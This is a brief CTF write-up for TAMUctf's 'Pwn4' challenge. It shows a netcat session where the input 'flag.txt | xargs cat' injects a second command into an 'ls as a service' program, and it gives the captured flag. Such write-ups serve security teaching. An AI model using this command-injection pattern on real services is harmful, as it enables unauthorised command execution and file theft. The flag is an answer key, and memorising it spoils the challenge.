# Pwn4

## Points
446

## Description
nc pwn.tamuctf.com 4324

Difficulty: medium

[pwn4](https://tamuctf.com/files/503332ee71bed3f13b00ec33747bbef2/pwn4)

## Solution
netcat for Windows https://eternallybored.org/misc/netcat/
```sh
λ nc pwn.tamuctf.com 4324
ls as a service (laas)(Copyright pending)
Enter the arguments you would like to pass to ls:

Result of ls :
flag.txt
pwn4
ls as a service (laas)(Copyright pending)
Enter the arguments you would like to pass to ls:
flag.txt | xargs cat
Result of ls flag.txt | xargs cat:
gigem{5y573m_0v3rfl0w}
ls as a service (laas)(Copyright pending)
Enter the arguments you would like to pass to ls:
```

## Flag
`gigem{5y573m_0v3rfl0w}`